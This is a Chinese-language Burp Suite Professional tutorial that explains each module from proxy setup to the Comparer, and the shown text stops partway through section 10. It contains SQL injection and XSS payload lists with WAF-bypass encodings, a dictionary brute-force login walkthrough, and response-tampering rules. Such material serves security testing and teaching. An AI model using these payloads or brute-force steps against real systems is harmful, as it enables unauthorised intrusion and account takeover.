# Burp Suite 专业版完全指南

> Burp Suite 是 Web 应用安全测试领域最强大的集成平台
> 本笔记基于 Burp Suite Professional 版本，涵盖从入门到高级的完整知识体系

---

## 目录

1. [Burp Suite 简介](#1-burp-suite-简介)
2. [安装与配置](#2-安装与配置)
3. [代理模块 (Proxy)](#3-代理模块-proxy)
4. [爬虫模块 (Spider/Crawler)](#4-爬虫模块-spidercrawler)
5. [扫描器模块 (Scanner)](#5-扫描器模块-scanner)
6. [入侵模块 (Intruder)](#6-入侵模块-intruder)
7. [重放模块 (Repeater)](#7-重放模块-repeater)
8. [序列器模块 (Sequencer)](#8-序列器模块-sequencer)
9. [解码器模块 (Decoder)](#9-解码器模块-decoder)
10. [比较器模块 (Comparer)](#10-比较器模块-comparer)
11. [扩展模块 (Extender)](#11-扩展模块-extender)
12. [高级技巧](#12-高级技巧)
13. [实战案例](#13-实战案例)
14. [常见错误与解决方案](#14-常见错误与解决方案)

---

## 1. Burp Suite 简介

### 1.1 什么是 Burp Suite？

Burp Suite 是由 PortSwigger 公司开发的 Web 应用安全测试平台。它就像是一个"中间人"，站在你的浏览器和目标网站之间，让你能够拦截、查看、修改所有的 HTTP/HTTPS 流量。

**通俗理解：** 想象你在寄信，Burp Suite 就是邮局里的工作人员，可以打开每一封信查看内容，甚至修改后再寄出去。在 Web 安全测试中，这让我们能够发现网站的安全漏洞。

### 1.2 版本对比

| 功能 | Community (免费版) | Professional (专业版) |
|------|-------------------|----------------------|
| 代理拦截 | ✅ | ✅ |
| Repeater | ✅ | ✅ |
| Decoder | ✅ | ✅ |
| Intruder | ⚠️ 限速 | ✅ 无限制 |
| Scanner | ❌ | ✅ |
| 爬虫 | ❌ | ✅ |
| 保存项目 | ❌ | ✅ |
| 扩展支持 | 部分 | 完整 |
| 价格 | 免费 | $449/年 |

### 1.3 核心模块概览

```
┌─────────────────────────────────────────────────────────────┐
│                      Burp Suite                              │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐        │
│  │  Proxy  │  │ Scanner │  │ Intruder│  │Repeater │        │
│  │ (代理)  │  │ (扫描器)│  │ (入侵)  │  │ (重放)  │        │
│  └─────────┘  └─────────┘  └─────────┘  └─────────┘        │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐        │
│  │Sequencer│  │ Decoder │  │Comparer │  │Extender │        │
│  │(序列器) │  │ (解码器)│  │(比较器) │  │ (扩展)  │        │
│  └─────────┘  └─────────┘  └─────────┘  └─────────┘        │
└─────────────────────────────────────────────────────────────┘
```


---

## 2. 安装与配置

### 2.1 系统要求

```
最低配置：
- 操作系统：Windows 10+, macOS 10.14+, Linux
- 内存：4GB RAM（推荐 8GB+）
- 磁盘：500MB 可用空间
- Java：内置 JRE（无需单独安装）

推荐配置：
- 内存：16GB+ RAM（大型扫描任务）
- SSD 硬盘（提升项目加载速度）
- 多核 CPU（并行扫描）
```

### 2.2 安装步骤

```bash
# 1. 下载
# 官网：https://portswigger.net/burp/releases
# 选择对应操作系统的安装包

# 2. Windows 安装
# 双击 burpsuite_pro_windows-x64_vX.X.X.exe
# 按向导完成安装

# 3. Linux 安装
chmod +x burpsuite_pro_linux_vX.X.X.sh
./burpsuite_pro_linux_vX.X.X.sh

# 4. macOS 安装
# 双击 .dmg 文件，拖拽到 Applications

# 5. 激活专业版
# 启动后输入许可证密钥
```

### 2.3 浏览器代理配置

**方法一：手动配置浏览器代理**

```
Firefox 配置：
设置 → 网络设置 → 手动代理配置
HTTP 代理：127.0.0.1  端口：8080
勾选"为所有协议使用此代理"

Chrome 配置：
设置 → 系统 → 打开计算机的代理设置
或使用扩展：FoxyProxy / SwitchyOmega
```

**方法二：使用 Burp 内置浏览器（推荐）**

```
Proxy → Intercept → Open Browser

优点：
- 自动配置代理
- 自动信任 Burp CA 证书
- 隔离测试环境
```

### 2.4 HTTPS 证书安装

要拦截 HTTPS 流量，必须安装 Burp 的 CA 证书：

```
1. 确保代理已启动（Proxy → Intercept is on）
2. 浏览器访问 http://burp 或 http://127.0.0.1:8080
3. 点击 "CA Certificate" 下载证书
4. 安装证书：

Windows：
- 双击证书 → 安装证书 → 本地计算机
- 将证书放入"受信任的根证书颁发机构"

Firefox（独立证书存储）：
- 设置 → 隐私与安全 → 证书 → 查看证书
- 导入 → 选择证书 → 勾选"信任此 CA 以标识网站"

macOS：
- 双击证书 → 添加到钥匙串
- 在钥匙串中找到 PortSwigger CA → 始终信任
```

### 2.5 项目配置

```
新建项目：
Burp → New Project → 选择项目类型

项目类型：
1. Temporary project - 临时项目，关闭后数据丢失
2. New project on disk - 保存到磁盘，可持久化
3. Open existing project - 打开已有项目

配置选项：
- Use Burp defaults - 使用默认配置
- Use options saved with project - 使用项目保存的配置
- Load from configuration file - 从配置文件加载
```

### 2.6 性能优化配置

```
User options → Connections：
- Platform authentication: 配置系统代理认证
- SOCKS proxy: 配置上游代理（如 Tor）

User options → Performance：
- 调整内存分配（大型项目建议 2GB+）

Project options → Sessions：
- Session handling rules: 配置会话保持
- Cookie jar: 管理 Cookie

推荐 JVM 参数（编辑启动脚本）：
-Xmx4g          # 最大堆内存 4GB
-Xms2g          # 初始堆内存 2GB
```

---

## 3. 代理模块 (Proxy)

### 3.1 代理模块概述

Proxy 是 Burp Suite 的核心模块，所有流量都通过它进行拦截和转发。它就像一个"关卡"，让你能够检查和修改每一个进出的请求。

**工作流程：**
```
浏览器 → Burp Proxy → 目标服务器
         ↓
    拦截/查看/修改
         ↓
浏览器 ← Burp Proxy ← 目标服务器
```

### 3.2 Intercept（拦截）

```
Proxy → Intercept

按钮说明：
- Intercept is on/off: 开启/关闭拦截
- Forward: 放行当前请求
- Drop: 丢弃当前请求
- Action: 更多操作（发送到其他模块）

快捷键：
Ctrl + F: Forward（放行）
Ctrl + D: Drop（丢弃）
Ctrl + T: Toggle intercept（切换拦截状态）
```

**拦截请求示例：**
```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

username=admin&password=123456
```

**修改请求：**
```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

username=admin&password=' OR '1'='1
```

### 3.3 HTTP History（历史记录）

```
Proxy → HTTP history

功能：
- 查看所有经过代理的请求/响应
- 按条件过滤和搜索
- 高亮标记重要请求
- 添加注释

过滤选项：
- Filter by MIME type: 按内容类型过滤
- Filter by status code: 按状态码过滤
- Filter by search term: 按关键词搜索
- Filter by file extension: 按文件扩展名过滤
- Filter by annotation: 按注释过滤

右键菜单常用操作：
- Send to Repeater: 发送到重放模块
- Send to Intruder: 发送到入侵模块
- Send to Scanner: 发送到扫描器
- Copy URL: 复制 URL
- Add to scope: 添加到作用域
```

### 3.4 Intercept 过滤规则

精确控制哪些请求需要拦截：

```
Proxy → Options → Intercept Client Requests

规则示例：

1. 只拦截特定域名：
   Rule: URL → matches → ^https?://.*\.example\.com/.*$

2. 只拦截 POST 请求：
   Rule: Request method → matches → POST

3. 排除静态资源：
   Rule: URL → Does not match → \.(js|css|png|jpg|gif|ico)$

4. 只拦截包含特定参数的请求：
   Rule: Request body → contains → password

组合规则（AND/OR 逻辑）：
- 多个规则默认是 AND 关系
- 使用 "Or" 选项创建 OR 关系
```

### 3.5 Match and Replace（匹配替换）

自动修改请求/响应内容：

```
Proxy → Options → Match and Replace

常用场景：

1. 自动添加请求头：
   Type: Request header
   Match: ^User-Agent:.*$
   Replace: User-Agent: Mozilla/5.0 (Custom Agent)

2. 移除安全头（测试用）：
   Type: Response header
   Match: ^X-Frame-Options:.*$
   Replace: (留空)

3. 修改 Cookie：
   Type: Request header
   Match: ^Cookie:.*session=([^;]+).*$
   Replace: Cookie: session=admin_session

4. 替换响应内容：
   Type: Response body
   Match: "isAdmin":false
   Replace: "isAdmin":true

5. 绕过前端验证：
   Type: Response body
   Match: disabled="disabled"
   Replace: (留空)
```

### 3.6 WebSocket 拦截

```
Proxy → WebSockets history

WebSocket 是一种全双工通信协议，常用于实时应用。
Burp 可以拦截和修改 WebSocket 消息。

拦截 WebSocket：
1. 建立 WebSocket 连接时会显示在 HTTP history
2. 后续消息显示在 WebSockets history
3. 可以修改消息内容后转发

示例 WebSocket 消息：
{"type":"chat","message":"Hello","user":"admin"}

修改后：
{"type":"chat","message":"<script>alert(1)</script>","user":"admin"}
```

### 3.7 代理监听器配置

```
Proxy → Options → Proxy Listeners

默认监听器：127.0.0.1:8080

添加新监听器：
- Bind to port: 端口号
- Bind to address: 绑定地址
  - Loopback only: 仅本地（127.0.0.1）
  - All interfaces: 所有网卡（0.0.0.0）
  - Specific address: 指定 IP

高级选项：
- Support invisible proxying: 透明代理模式
- Certificate: 自定义 SSL 证书
- TLS Protocols: 选择支持的 TLS 版本

多监听器场景：
- 8080: 浏览器代理
- 8081: 移动设备代理
- 8082: 特定应用代理
```

---

## 4. 爬虫模块 (Spider/Crawler)

### 4.1 爬虫概述

爬虫模块用于自动发现网站的所有页面和功能点。它会模拟用户浏览行为，点击链接、提交表单，从而构建完整的站点地图。

**新版 Burp 使用 Crawler（爬虫）替代了旧版的 Spider**

```
工作原理：
1. 从种子 URL 开始
2. 解析页面中的链接
3. 递归访问新发现的链接
4. 识别表单并尝试提交
5. 构建站点地图
```

### 4.2 启动爬虫

```
方法一：从 Target 启动
Target → Site map → 右键目标 → Scan → Crawl

方法二：从 Dashboard 启动
Dashboard → New scan → Crawl

配置选项：
- Crawl optimization: 爬虫优化级别
  - Fastest: 最快，可能遗漏内容
  - Fast: 快速
  - Normal: 正常（推荐）
  - Thorough: 彻底，耗时较长

- Crawl limits:
  - Maximum crawl time: 最大爬取时间
  - Maximum unique locations: 最大唯一位置数
  - Maximum request count: 最大请求数
```

### 4.3 爬虫配置详解

```
Dashboard → New scan → Scan configuration → Crawling

登录配置（重要！）：
- Application login:
  - Use recorded login sequence: 使用录制的登录序列
  - Use credentials: 直接提供用户名密码
  
录制登录序列：
1. 点击 "Record login sequence"
2. 在弹出的浏览器中完成登录
3. 标记登录成功的标志（如"欢迎"文字）
4. 保存登录序列

爬虫行为配置：
- Maximum link depth: 最大链接深度
- Maximum crawl time: 最大爬取时间
- Crawl strategy:
  - Fastest: 广度优先，快速覆盖
  - More complete: 深度优先，更完整
  - Most complete: 最完整，耗时最长

表单处理：
- Form submission: 表单提交策略
  - Submit forms: 提交表单
  - Don't submit forms: 不提交表单
- Form field values: 表单字段默认值
```

### 4.4 站点地图 (Site Map)

```
Target → Site map

视图模式：
- Contents: 内容视图，显示所有请求
- Issues: 问题视图，显示发现的漏洞

站点地图结构：
example.com
├── /
├── /login
├── /admin
│   ├── /admin/users
│   └── /admin/settings
├── /api
│   ├── /api/v1/users
│   └── /api/v1/products
└── /static
    ├── /static/js
    └── /static/css

颜色标记：
- 黑色：已请求
- 灰色：推断存在（从链接发现但未请求）
- 红色：存在安全问题

右键操作：
- Add to scope: 添加到作用域
- Remove from scope: 从作用域移除
- Scan: 扫描
- Spider: 爬取
- Compare site maps: 比较站点地图
```

### 4.5 作用域配置 (Scope)

作用域定义了测试的边界，非常重要！

```
Target → Scope

Include in scope（包含）：
- 添加目标域名
- 支持正则表达式

Exclude from scope（排除）：
- 排除登出链接（避免会话失效）
- 排除危险操作（如删除）
- 排除第三方域名

示例配置：

Include:
Protocol: Any
Host: ^example\.com$
Port: Any
File: ^/.*

Exclude:
Protocol: Any
Host: Any
Port: Any
File: ^/logout.*
File: ^/api/delete.*
File: ^/admin/destroy.*

作用域的作用：
1. 限制爬虫范围
2. 限制扫描范围
3. 过滤 HTTP history 显示
4. 防止测试越界
```


---

## 5. 扫描器模块 (Scanner)

### 5.1 扫描器概述

Scanner 是 Burp Suite Professional 的核心功能，能够自动检测 Web 应用中的安全漏洞。它结合了爬虫和漏洞检测，是渗透测试的强大助手。

**扫描器能检测的漏洞类型：**
- SQL 注入 (SQLi)
- 跨站脚本 (XSS)
- 命令注入
- 路径遍历
- XML 外部实体 (XXE)
- 服务端请求伪造 (SSRF)
- 不安全的反序列化
- 敏感信息泄露
- 配置错误
- 等等...

### 5.2 扫描类型

```
1. 主动扫描 (Active Scan)
   - 主动发送攻击载荷
   - 可能修改数据
   - 检测更多漏洞
   - 需要授权！

2. 被动扫描 (Passive Scan)
   - 只分析经过的流量
   - 不发送额外请求
   - 不会修改数据
   - 安全，可随时开启

3. 爬取+扫描 (Crawl and Audit)
   - 先爬取站点
   - 再进行主动扫描
   - 最完整的扫描方式
```

### 5.3 启动扫描

```
方法一：扫描单个请求
HTTP history → 右键请求 → Scan → Active scan

方法二：扫描整个站点
Target → Site map → 右键目标 → Scan

方法三：从 Dashboard 启动
Dashboard → New scan

扫描配置：
1. Scan type:
   - Crawl and audit: 爬取并审计
   - Crawl: 仅爬取
   - Audit selected items: 审计选中项

2. URLs to scan: 扫描的 URL

3. Scan configuration: 扫描配置
   - 选择预设或自定义
```

### 5.4 扫描配置详解

```
Dashboard → New scan → Scan configuration

审计优化 (Audit optimization):
- Fastest: 最快，检测基本漏洞
- Fast: 快速
- Normal: 正常（推荐）
- Thorough: 彻底，检测更多漏洞

审计检测项 (Issues reported):
- SQL injection
- Cross-site scripting (XSS)
- OS command injection
- Path traversal
- XML/XXE injection
- Server-side request forgery
- HTTP request smuggling
- 等等...

可以根据需要启用/禁用特定检测项

审计准确性 (Audit accuracy):
- Minimize false negatives: 减少漏报（更多检测）
- Minimize false positives: 减少误报（更精确）
- Normal: 平衡

处理应用错误:
- Skip checks if application errors: 遇到错误时跳过
- Continue checks: 继续检测
```

### 5.5 扫描结果分析

```
Dashboard → Issue activity
Target → Site map → Issues

漏洞严重级别：
- High (高危): 红色，需立即修复
- Medium (中危): 橙色，应尽快修复
- Low (低危): 黄色，建议修复
- Information (信息): 蓝色，供参考

漏洞详情包含：
1. Issue type: 漏洞类型
2. Severity: 严重级别
3. Confidence: 置信度（Certain/Firm/Tentative）
4. Host: 受影响主机
5. Path: 受影响路径
6. Issue detail: 详细描述
7. Request/Response: 证明请求和响应
8. Remediation: 修复建议

导出报告：
Target → Site map → 右键 → Issues → Report issues
支持格式：HTML, XML
```

### 5.6 被动扫描配置

```
Dashboard → Live passive crawl / Live audit

被动扫描自动分析所有经过 Burp 的流量

检测项目：
- 敏感信息泄露（密码、API Key、私钥）
- 不安全的 Cookie 设置
- 缺失的安全头
- 混合内容（HTTPS 页面加载 HTTP 资源）
- 可缓存的敏感响应
- 信息泄露（错误信息、版本号）
- 等等...

配置位置：
Dashboard → Live passive crawl from Proxy
- 开启/关闭被动爬取

Dashboard → Live audit from Proxy
- 开启/关闭被动审计
```


---

## 6. 入侵模块 (Intruder)

### 6.1 Intruder 概述

Intruder 是 Burp Suite 中最强大的模块之一，用于自动化定制攻击。它可以对请求中的特定位置进行大量变体测试，常用于：

- 暴力破解密码
- 枚举用户名
- 模糊测试 (Fuzzing)
- 参数篡改
- 漏洞利用

**通俗理解：** 如果说手动测试是"一枪一枪打"，那 Intruder 就是"机关枪扫射"，能够快速测试大量可能性。

### 6.2 攻击类型

```
Intruder → Positions → Attack type

1. Sniper（狙击手）
   - 单个 payload 集
   - 依次替换每个位置
   - 适用于：单参数测试
   
   示例：
   位置：username=§admin§&password=§123§
   Payload: [test1, test2]
   
   请求1: username=test1&password=123
   请求2: username=test2&password=123
   请求3: username=admin&password=test1
   请求4: username=admin&password=test2

2. Battering ram（攻城锤）
   - 单个 payload 集
   - 同时替换所有位置（相同值）
   - 适用于：多处使用相同值
   
   示例：
   位置：token=§abc§&verify=§abc§
   Payload: [111, 222]
   
   请求1: token=111&verify=111
   请求2: token=222&verify=222

3. Pitchfork（草叉）
   - 多个 payload 集（每个位置一个）
   - 并行使用（第1个配第1个）
   - 适用于：用户名密码配对
   
   示例：
   位置：username=§admin§&password=§123§
   Payload1: [user1, user2]
   Payload2: [pass1, pass2]
   
   请求1: username=user1&password=pass1
   请求2: username=user2&password=pass2

4. Cluster bomb（集束炸弹）
   - 多个 payload 集
   - 笛卡尔积（所有组合）
   - 适用于：暴力破解
   
   示例：
   位置：username=§admin§&password=§123§
   Payload1: [user1, user2]
   Payload2: [pass1, pass2]
   
   请求1: username=user1&password=pass1
   请求2: username=user1&password=pass2
   请求3: username=user2&password=pass1
   请求4: username=user2&password=pass2
```

### 6.3 配置攻击位置

```
Intruder → Positions

1. 发送请求到 Intruder：
   HTTP history → 右键 → Send to Intruder

2. 标记攻击位置：
   - 选中要测试的值
   - 点击 "Add §" 按钮
   - 或手动添加 § 符号

3. 位置操作按钮：
   - Add §: 添加位置标记
   - Clear §: 清除所有标记
   - Auto §: 自动标记（识别参数值）

示例请求：
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=§admin§&password=§password123§

注意事项：
- § 符号成对出现，包围要替换的值
- 可以标记 URL、Header、Body 中的任何位置
- Cookie 中的值也可以标记
```

### 6.4 Payload 配置

```
Intruder → Payloads

Payload Sets:
- Payload set: 选择要配置的位置（1, 2, 3...）
- Payload type: 选择 payload 类型

常用 Payload 类型：

1. Simple list（简单列表）
   - 手动输入或从文件加载
   - 最常用的类型
   
   Load: 从文件加载
   Paste: 粘贴列表
   Add: 手动添加

2. Runtime file（运行时文件）
   - 从文件逐行读取
   - 适合大型字典
   - 不会全部加载到内存

3. Numbers（数字）
   - 生成数字序列
   From: 起始值
   To: 结束值
   Step: 步长
   
   示例：1-1000，步长1

4. Dates（日期）
   - 生成日期序列
   - 可自定义格式

5. Brute forcer（暴力破解器）
   - 生成字符组合
   Character set: 字符集
   Min length: 最小长度
   Max length: 最大长度
   
   示例：a-z, 4-6位 = aaaa 到 zzzzzz

6. Null payloads（空载荷）
   - 不替换，只重复请求
   - 用于测试速率限制

7. Username generator
   - 根据姓名生成用户名变体
   - 如：John Smith → jsmith, john.smith, smithj
```

### 6.5 Payload 处理

```
Intruder → Payloads → Payload processing

添加处理规则，对 payload 进行转换：

1. Add prefix（添加前缀）
   Payload: admin → Prefix: user_ → user_admin

2. Add suffix（添加后缀）
   Payload: admin → Suffix: @test.com → admin@test.com

3. Match/Replace（匹配替换）
   使用正则表达式替换

4. Encode（编码）
   - URL-encode
   - HTML-encode
   - Base64-encode
   - Hash (MD5, SHA-1, SHA-256...)

5. Decode（解码）
   - URL-decode
   - HTML-decode
   - Base64-decode

6. Case modification（大小写）
   - To lower case
   - To upper case
   - Capitalize

处理规则示例（密码 MD5 加密）：
1. 原始 payload: password123
2. 添加规则: Hash → MD5
3. 最终 payload: 482c811da5d5b4bc6d497ffa98491e38

多规则组合：
规则按顺序执行，可以组合多个处理
```

### 6.6 Payload 编码

```
Intruder → Payloads → Payload encoding

URL-encode these characters:
- 默认编码特殊字符
- 可自定义需要编码的字符

常见场景：
1. 测试 SQL 注入时，保留单引号不编码
2. 测试 XSS 时，保留 < > 不编码
3. 测试路径遍历时，保留 ../ 不编码

取消勾选 "URL-encode these characters" 可发送原始 payload
```

### 6.7 攻击选项

```
Intruder → Settings (或 Options)

Request Engine（请求引擎）：
- Number of threads: 并发线程数（专业版无限制）
- Number of retries on network failure: 网络失败重试次数
- Pause before retry: 重试前暂停时间
- Throttle: 请求间隔（避免触发防护）

Attack Results（攻击结果）：
- Store requests/responses: 保存请求响应
- Make unmodified baseline request: 发送基准请求

Grep - Match（匹配）：
- 在响应中搜索特定字符串
- 用于识别成功/失败

Grep - Extract（提取）：
- 从响应中提取特定内容
- 如提取 token、错误信息

Grep - Payloads：
- 检查响应中是否包含 payload
- 用于检测反射型 XSS

Redirections（重定向）：
- Follow redirections: 跟随重定向
- Process cookies: 处理 Cookie
```

### 6.8 分析攻击结果

```
攻击完成后，结果表格显示：

列说明：
- Request: 请求编号
- Payload: 使用的 payload
- Status: HTTP 状态码
- Error: 是否有错误
- Timeout: 是否超时
- Length: 响应长度
- Comment: 注释

识别成功的技巧：

1. 状态码变化
   - 登录成功：200 → 302（重定向）
   - 找到资源：404 → 200

2. 响应长度变化
   - 成功响应通常长度不同
   - 排序后容易发现异常

3. 响应时间变化
   - SQL 注入可能导致延迟
   - 时间盲注的关键指标

4. Grep 匹配
   - 配置匹配 "Login successful"
   - 配置匹配 "Welcome"

5. 响应内容
   - 双击查看完整请求/响应
   - 搜索关键词

结果过滤：
- 点击列标题排序
- 使用过滤器筛选
- 右键标记/高亮
```

### 6.9 实战：暴力破解登录

```
场景：破解登录页面

1. 捕获登录请求：
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=test

2. 发送到 Intruder，标记位置：
username=admin&password=§test§

3. 选择攻击类型：Sniper

4. 配置 Payload：
   - Type: Simple list
   - Load: 加载密码字典（如 rockyou.txt）

5. 配置 Grep Match：
   - 添加: "Login failed"（失败标志）
   - 添加: "Welcome"（成功标志）

6. 启动攻击：Start attack

7. 分析结果：
   - 查找没有 "Login failed" 的响应
   - 查找有 "Welcome" 的响应
   - 查找响应长度异常的请求

8. 验证：
   - 使用发现的密码手动登录验证
```


---

## 7. 重放模块 (Repeater)

### 7.1 Repeater 概述

Repeater 是手动测试的核心工具，允许你修改请求并重复发送，观察响应变化。它就像一个"实验室"，让你可以反复尝试不同的输入。

**使用场景：**
- 手动测试漏洞
- 验证扫描器发现的问题
- 调试和理解应用行为
- 构造复杂的攻击载荷

### 7.2 基本使用

```
1. 发送请求到 Repeater：
   HTTP history → 右键 → Send to Repeater
   快捷键：Ctrl + R

2. 修改请求：
   - 直接编辑请求内容
   - 修改参数、Header、Body

3. 发送请求：
   - 点击 "Send" 按钮
   - 快捷键：Ctrl + Space

4. 查看响应：
   - 右侧面板显示响应
   - 可切换 Raw/Pretty/Hex 视图

5. 多标签页：
   - 每个请求一个标签页
   - 可重命名标签（双击标签名）
   - 方便对比不同测试
```

### 7.3 请求编辑技巧

```
视图模式：
- Raw: 原始文本
- Pretty: 格式化显示（JSON/XML）
- Hex: 十六进制
- Render: 渲染 HTML（仅响应）

编辑技巧：

1. 快速修改参数值：
   双击参数值 → 直接编辑

2. 添加/删除 Header：
   直接在请求中添加或删除行

3. 修改请求方法：
   右键 → Change request method
   GET ↔ POST 自动转换参数

4. URL 编码/解码：
   选中文本 → 右键 → Convert selection
   - URL-encode
   - URL-decode
   - Base64-encode/decode
   - HTML-encode/decode

5. 快速插入：
   右键 → Insert → 
   - Payload position marker (§)
   - Collaborator payload
```

### 7.4 实战：手动测试 SQL 注入

```
原始请求：
GET /product?id=1 HTTP/1.1
Host: target.com

测试步骤：

1. 测试单引号：
GET /product?id=1' HTTP/1.1
→ 观察是否报错

2. 测试注释：
GET /product?id=1'-- HTTP/1.1
GET /product?id=1'# HTTP/1.1
→ 错误消失说明存在注入

3. 测试 UNION：
GET /product?id=1' UNION SELECT NULL-- HTTP/1.1
GET /product?id=1' UNION SELECT NULL,NULL-- HTTP/1.1
→ 确定列数

4. 提取数据：
GET /product?id=1' UNION SELECT username,password FROM users-- HTTP/1.1

5. 时间盲注测试：
GET /product?id=1' AND SLEEP(5)-- HTTP/1.1
→ 响应延迟说明存在注入

常用 SQL 注入 Payload：
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
admin'--
1' AND 1=1--
1' AND 1=2--
1' UNION SELECT NULL--
1' ORDER BY 1--
```

### 7.5 实战：手动测试 XSS

```
原始请求：
GET /search?q=test HTTP/1.1
Host: target.com

测试步骤：

1. 基础测试：
GET /search?q=<script>alert(1)</script> HTTP/1.1
→ 检查响应中是否原样返回

2. 事件处理器：
GET /search?q=<img src=x onerror=alert(1)> HTTP/1.1
GET /search?q=<svg onload=alert(1)> HTTP/1.1

3. 绕过过滤：
GET /search?q=<ScRiPt>alert(1)</ScRiPt> HTTP/1.1
GET /search?q=<script>alert`1`</script> HTTP/1.1
GET /search?q=<script>alert(String.fromCharCode(88,83,83))</script> HTTP/1.1

4. 属性注入：
GET /search?q=" onmouseover="alert(1) HTTP/1.1
GET /search?q=' onfocus='alert(1)' autofocus=' HTTP/1.1

5. JavaScript 上下文：
GET /search?q=';alert(1);// HTTP/1.1
GET /search?q=\';alert(1);// HTTP/1.1

常用 XSS Payload：
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
```

### 7.6 响应分析

```
响应面板功能：

1. 状态码分析：
   - 200: 成功
   - 301/302: 重定向
   - 400: 请求错误
   - 401: 未授权
   - 403: 禁止访问
   - 404: 未找到
   - 500: 服务器错误

2. 响应头分析：
   - Set-Cookie: 会话管理
   - Content-Type: 内容类型
   - X-Frame-Options: 点击劫持防护
   - Content-Security-Policy: CSP 策略

3. 响应体分析：
   - 搜索关键词（Ctrl + F）
   - 查找敏感信息
   - 分析错误信息

4. 响应时间：
   - 右下角显示响应时间
   - 用于时间盲注判断

5. 响应对比：
   - 右键 → Send to Comparer
   - 对比不同请求的响应差异
```

---

## 8. 序列器模块 (Sequencer)

### 8.1 Sequencer 概述

Sequencer 用于分析令牌（Token）的随机性质量。在 Web 应用中，会话 ID、CSRF Token、密码重置令牌等都需要足够随机，否则可能被预测和伪造。

**通俗理解：** 如果一个网站的会话 ID 是 1, 2, 3, 4...这样递增的，攻击者很容易猜到其他用户的会话 ID。Sequencer 就是用来检测这种问题的。

### 8.2 使用方法

```
1. 捕获包含令牌的响应：
   - 登录响应中的 Session ID
   - 表单中的 CSRF Token
   - API 返回的 Token

2. 发送到 Sequencer：
   HTTP history → 右键 → Send to Sequencer

3. 配置令牌位置：
   - Select Custom location: 自定义位置
   - 选中响应中的令牌值
   - 点击 "Define custom location"

4. 开始采集：
   - 点击 "Start live capture"
   - Burp 会自动重复请求，收集令牌

5. 分析结果：
   - 收集足够样本后（建议 10000+）
   - 点击 "Analyze now"
```

### 8.3 分析结果解读

```
Sequencer → Analysis Results

Overall result（总体结果）：
- Excellent: 优秀（>128 bits）
- Good: 良好（>64 bits）
- Reasonable: 合理（>32 bits）
- Poor: 较差（<32 bits）
- Very poor: 非常差

有效熵（Effective entropy）：
- 表示令牌的随机性强度
- 越高越好，建议 > 64 bits

字符级分析：
- 每个字符位置的随机性
- 识别固定或可预测的部分

位级分析：
- 每个比特位的随机性
- 更细粒度的分析

示例分析：
令牌: abc123def456
如果分析显示前3位总是 "abc"，
说明这部分是固定的，降低了随机性。

安全建议：
- 会话 ID 应至少 128 bits 熵
- 使用加密安全的随机数生成器
- 避免使用时间戳、递增数字
```

---

## 9. 解码器模块 (Decoder)

### 9.1 Decoder 概述

Decoder 是一个编码/解码工具，支持多种编码格式的转换。在渗透测试中，经常需要对数据进行编码或解码。

### 9.2 支持的编码格式

```
编码类型：
- URL encoding: URL 编码
- HTML encoding: HTML 实体编码
- Base64: Base64 编码
- ASCII Hex: 十六进制
- Hex: 十六进制
- Octal: 八进制
- Binary: 二进制
- Gzip: Gzip 压缩

哈希类型：
- MD5
- SHA-1
- SHA-256
- SHA-384
- SHA-512
```

### 9.3 使用方法

```
Decoder 面板操作：

1. 输入数据：
   - 直接粘贴
   - 从其他模块发送（右键 → Send to Decoder）

2. 编码操作：
   - Encode as: 选择编码类型
   - 支持链式编码（多次编码）

3. 解码操作：
   - Decode as: 选择解码类型
   - Smart decode: 智能解码（自动识别）

4. 哈希操作：
   - Hash: 选择哈希算法

示例：

原文: admin
URL 编码: admin（无特殊字符不变）
Base64 编码: YWRtaW4=
MD5 哈希: 21232f297a57a5a743894a0e4a801fc3

原文: <script>alert(1)</script>
URL 编码: %3Cscript%3Ealert%281%29%3C%2Fscript%3E
HTML 编码: &lt;script&gt;alert(1)&lt;/script&gt;
```

### 9.4 实战应用

```
场景1：解码可疑参数
发现 URL 中有 Base64 编码的参数：
/page?data=eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZ3Vlc3QifQ==

解码后：
{"user":"admin","role":"guest"}

可能的攻击：修改 role 为 admin

场景2：绕过 WAF
原始 payload: <script>alert(1)</script>

尝试不同编码：
URL 编码: %3Cscript%3Ealert(1)%3C/script%3E
双重 URL 编码: %253Cscript%253Ealert(1)%253C/script%253E
Unicode 编码: \u003cscript\u003ealert(1)\u003c/script\u003e
HTML 实体: &#60;script&#62;alert(1)&#60;/script&#62;

场景3：破解简单加密
发现 Cookie 值看起来像 Base64：
session=YWRtaW46MTIzNDU2

解码：admin:123456
可能是用户名:密码的简单编码

场景4：分析 JWT Token
JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx

Header (Base64): {"alg":"HS256","typ":"JWT"}
Payload (Base64): {"user":"admin"}
```

---

## 10. 比较器模块 (Comparer)

### 10.1 Comparer 概述

Comparer 用于比较两个数据项的差异，可以是请求、响应或任意文本。在渗透测试中，比较不同输入产生的响应差异是发现漏洞的重要方法。

### 10.2 使用方法

```
1. 发送数据到 Comparer：
   - 右键 → Send to Comparer
   - 选择发送 Request 或 Response

2. 添加比较项：
   - 至少需要两个项目
   - 可以比较多个项目

3. 执行比较：
   - Words: 按单词比较
   - Bytes: 按字节比较

4. 查看结果：
   - 差异部分高亮显示
   - Modified: 修改的部分
   - Deleted: 删除的部分
   - Added: 新增的部分
```

### 10.3 实战应用

```
场景1：识别有效用户名
请求1: username=admin（存在的用户）
响应1: "Invalid password"

请求2: username=nonexistent（不存在的用户）
响应2: "User not found"

比较发现响应不同 → 可枚举用户名

场景2：布尔盲注判断
请求1: id=1 AND 1=1
响应1: 正常页面内容

请求2: id=1 AND 1=2
响应2: 页面内容不同

比较发现差异 → 存在 SQL 注入

场景3：权限测试
请求1: 普通用户访问 /admin
